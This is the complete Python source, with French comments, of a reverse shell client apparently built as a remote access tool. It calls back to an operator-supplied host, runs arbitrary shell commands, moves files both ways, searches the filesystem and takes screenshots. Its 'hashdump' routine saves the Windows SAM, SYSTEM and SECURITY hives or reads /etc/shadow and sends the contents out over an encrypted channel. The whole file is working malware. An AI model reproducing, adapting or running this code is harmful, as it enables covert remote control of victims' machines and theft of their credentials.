import socket
import subprocess
import os
import sys
import platform
from time import sleep
from base64 import b64encode, b64decode
from aes_crypt import AESCipher  # Import de la classe AESCipher depuis le fichier aes_crypt

# pour le screenshot en fonction du systeme d'exploitation
if platform.system() == "Windows":
    from mss import mss
else:
    from PIL import ImageGrab

class ReverseShellClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.conn = None

    def start(self):
        while True:
            try:
                self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.conn.connect((self.host, self.port))
                self.send_client_info()
                self.listen_for_commands()
            except Exception as e:
                print(f"Connection error: {e}")
                sleep(10)

    def send_client_info(self):
        try:
            hostname = socket.gethostname()
            os_type = platform.system()
            client_info = f"{hostname}|{os_type}"
            self.send_large_data(client_info)
        except Exception as e:
            print(f"Failed to send client info: {e}")

    def listen_for_commands(self):
        try:
            while True:
                data = self.conn.recv(4096).decode("utf-8")
                if not data:
                    break
                decrypted_data = AESCipher.decrypt(data)
                if decrypted_data.lower() == "exit":
                    break
                elif decrypted_data.startswith("download"):
                    self.handle_download(decrypted_data)
                elif decrypted_data.startswith("upload"):
                    self.handle_upload(decrypted_data)
                elif decrypted_data.startswith("search"):
                    self.handle_search(decrypted_data)
                elif decrypted_data.startswith("hashdump"):
                    self.handle_hashdump()
                elif decrypted_data.startswith("screenshot"):
                    self.handle_screenshot()
                else:
                    self.execute_command(decrypted_data)
        finally:
            self.conn.close()

    def handle_download(self, command):
        file_path = command.split(" ", 1)[1]
        try:
            with open(file_path, "rb") as f:
                while True:
                    chunk = f.read(4096)
                    if not chunk:
                        break
                    self.conn.send(
                        AESCipher.encrypt(b64encode(chunk).decode("utf-8")).encode(
                            "utf-8"
                        )
                    )
            self.conn.send(AESCipher.encrypt("EOF").encode("utf-8"))
        except Exception as e:
            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))

    def handle_upload(self, command):
        parts = command.split(" ", 2)
        file_path = parts[1]
        buffer_size = int(parts[2])

        try:
            with open(file_path, "wb") as f:
                while True:
                    data = self.conn.recv(buffer_size)
                    decrypted_data = AESCipher.decrypt(data.decode("utf-8"))
                    if decrypted_data == "EOF":
                        break
                    f.write(b64decode(decrypted_data))
            print(f"File {file_path} uploaded successfully.")
        except Exception as e:
            print(f"Failed to upload {file_path}: {e}")
            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))

    def handle_search(self, command):
        file_name = command.split(" ", 1)[1]
        if os.name == "nt":
            command = f"dir /s /b {file_name}"
        else:
            command = f"find / -name {file_name} 2>/dev/null"
        result = self.run_system_command(command)
        self.send_large_data(result)

    def handle_hashdump(self):
        if os.name == "nt":
            commands = [
                "reg save hklm\\sam C:\\Windows\\Temp\\sam && reg save hklm\\system C:\\Windows\\Temp\\system && reg save hklm\\security C:\\Windows\\Temp\\security",
                "powershell -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\Temp\\sam'))\"",
                "powershell -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\Temp\\system'))\"",
                "powershell -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\Temp\\security'))\"",
            ]
            result = ""
            for cmd in commands:
                result += self.run_system_command(cmd) + "\n"
        else:
            try:
                result = self.run_system_command(
                    "sudo cat /etc/shadow || cat /etc/shadow"
                )
            except subprocess.CalledProcessError as e:
                result = f"Error: {e.output.decode('utf-8')}"
            except Exception as e:
                result = str(e)
        self.send_large_data(result)

    def handle_screenshot(self): # Fonction pour prendre une capture d'écran
        try: # Gestion des erreurs
            if platform.system() == "Windows": # Si le système d'exploitation est Windows
                with mss() as sct: # Utilisation de la librairie mss
                    sct.shot(output="screenshot.png") # Prendre une capture d'écran et l'enregistrer dans un fichier
            else:
                screenshot_linux = ImageGrab.grab() # Prendre une capture d'écran
                screenshot_linux.save("screenshot.png") #     Enregistrer la capture d'écran dans un fichier
            taille_img = str(os.path.getsize("screenshot.png")) # Récupérer la taille du fichier
            self.conn.send(taille_img.encode("utf-8")) # Envoyer la taille du fichier
            with open("screenshot.png", "rb") as img: # Ouvrir le fichier en mode lecture binaire
                self.conn.sendfile(img) # Envoyer le fichier
            os.remove("screenshot.png")   # Supprimer le fichier
        except Exception as e:
            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8")) # Envoyer une erreur

    def execute_command(self, command):
        try:
            result = self.run_system_command(command)
        except Exception as e:
            result = str(e)
        self.send_large_data(result)

    def send_large_data(self, data):
        chunks = [data[i : i + 1024] for i in range(0, len(data), 1024)]
        for chunk in chunks:
            self.conn.send(AESCipher.encrypt(chunk).encode("utf-8"))
        self.conn.send(AESCipher.encrypt("EOF").encode("utf-8"))

    def run_system_command(self, command):
        try:
            output = subprocess.check_output(
                command, shell=True, stderr=subprocess.STDOUT
            )
            return output.decode("utf-8")
        except subprocess.CalledProcessError as e:
            return str(e)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python client.py <HOST> <PORT>")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    client = ReverseShellClient(host, port)
    client.start()
